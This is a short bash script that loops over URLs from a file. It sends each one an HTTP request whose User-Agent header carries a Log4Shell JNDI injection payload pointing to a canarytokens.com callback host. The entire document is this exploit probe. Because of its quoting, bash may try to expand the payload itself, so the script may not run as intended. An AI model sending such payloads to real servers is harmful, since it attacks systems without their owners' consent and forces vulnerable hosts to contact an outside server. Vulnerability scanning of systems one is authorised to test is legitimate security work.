#!/bin/bash
cat urls.txt  | while read url; do log4=$(curl -s -L $url -H User-Agent:"${jndi:ldap://REPLACE.canarytokens.com/a}");echo -e "$url -> User-Agent: SENT!";done
